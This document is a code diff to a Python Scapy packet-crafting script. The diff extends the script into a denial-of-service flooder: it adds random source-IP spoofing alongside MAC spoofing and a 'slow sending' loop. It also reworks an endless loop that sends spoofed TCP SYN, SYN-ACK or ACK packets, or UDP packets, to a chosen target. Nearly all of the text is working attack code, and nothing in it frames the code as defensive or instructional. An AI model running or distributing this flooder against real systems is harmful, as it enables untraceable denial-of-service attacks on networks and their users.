@@ -1,5 +1,6 @@
 from scapy.all import *
 import random
+import time
 
 
 ###################################################################################################
@@ -12,8 +13,9 @@ import random
 ###################################################################################################
 #Define your interface
 interface="en0"
+s = conf.L3socket(iface=interface)
 
-macspoof, srcip, dstip, prot, port, flag, msg, dos = "","","","","","","",""
+macspoof,ipspoof, srcip, dstip, prot, port, flag, msg, dos, slow = "","","","","","","","","",""
 
 #Define parameter
 if len(sys.argv) > 1 :
@@ -37,6 +39,16 @@ def macspoofer():
     mac=mac[0]+":"+mac[1]+":"+mac[2]+":"+mac[3]+":"+mac[4]+":"+mac[5]
     return mac
 
+def ipspoofer():
+    ip1=str(random.randrange(1,254))
+    ip2=str(random.randrange(1,254))
+    ip3=str(random.randrange(1,254))
+    ip4=str(random.randrange(1,254))
+    ipaddr=[ip1, ip2, ip3, ip4]
+    ipaddr=ipaddr[0]+"."+ipaddr[1]+"."+ipaddr[2]+"."+ipaddr[3]
+    return ipaddr
+
+
 if macspoof == "":
     print ("Enable Mac Spoofer? - [YES] or [NO]:")
     macspoof=str(input())
@@ -46,6 +58,15 @@ if macspoof == "YES":
     mac=macspoofer()
     print("Using SRC-MAC-Address: "+mac)
     etherframe=Ether(src=mac)
+
+if ipspoof == "" and srcip== "":
+    print ("Enable IP-SRC Spoofer? - [YES] or [NO]:")
+    ipspoof=str(input())
+    ipspoof=ipspoof.upper()
+
+if ipspoof == "YES" or srcip=="YES":
+    srcip=ipspoofer()
+    print("Using SRC-IP-Address: "+srcip)
 
 if srcip == "":
     print("SRC_IP: ")
@@ -64,7 +85,7 @@ if port == "":
     print("Choose DST-Port: ")
     port=int(input())
 
-if prot == "" or prot == "TCP":
+if (prot == "" or flag == "") and prot != "UDP":
         print("Choose Flag: [S],[SA],[A] ")
         flag=str(input())
         flag=flag.upper()
@@ -81,6 +102,11 @@ if dos == "":
     print ("DoS? - [YES] or [NO] :-)  : ")
     dos=str(input())
     dos=dos.upper()
+
+if slow == "":
+    print ("Slow sending?: [YES] or [NO] : ")
+    slow=str(input())
+    slow=slow.upper()
 
 # Build IP-Header
 iphdr=IP(src=srcip,dst=dstip)
@@ -115,20 +141,39 @@ else:
 # DOS sending...
 if dos =="YES":
     while True:
-        if macspoof == "YES":
-            if prot == "TCP":
-                mac=macspoofer()
-                etherframe=Ether(src=mac)
+        if macspoof == "YES" and prot == "TCP":
+            mac=macspoofer()
+            etherframe=Ether(src=mac)
+            if ipspoof == "YES":
+                iphdr=IP(src=ipspoofer(),dst=dstip)
+            srcport=random.randrange(1025,65535)
+            tcp=TCP(sport=srcport,dport=port,flags=flag)
+            packet=etherframe/iphdr/tcp/data
+            sendp(packet, iface=interface)
+        else:
+            mac=macspoofer()
+            etherframe=Ether(src=mac)
+            srcport=random.randrange(1025,65535)
+            udp=UDP(sport=srcport,dport=port)
+            packet=etherframe/iphdr/udp/data
+            sendp(packet, iface=interface)
+else:
+    if slow == "YES":
+        while True:
+            if ipspoof == "YES":
+                iphdr=IP(src=ipspoofer(),dst=dstip)
+            elif prot=="TCP":
                 srcport=random.randrange(1025,65535)
                 tcp=TCP(sport=srcport,dport=port,flags=flag)
-                packet=etherframe/iphdr/tcp/data
-                sendp(packet, iface=interface)
-            else:
-                mac=macspoofer()
-                etherframe=Ether(src=mac)
+                packet=iphdr/tcp/data
+            elif prot =="UDP":
                 srcport=random.randrange(1025,65535)
                 udp=UDP(sport=srcport,dport=port)
-                packet=etherframe/iphdr/udp/data
-                sendp(packet, iface=interface)
-        else:
-            send(packet)
+                packet=iphdr/udp/data
+
+            s.send(packet)
+            time.sleep(1)
+
+
+s.send(packet)
+#send(packet)
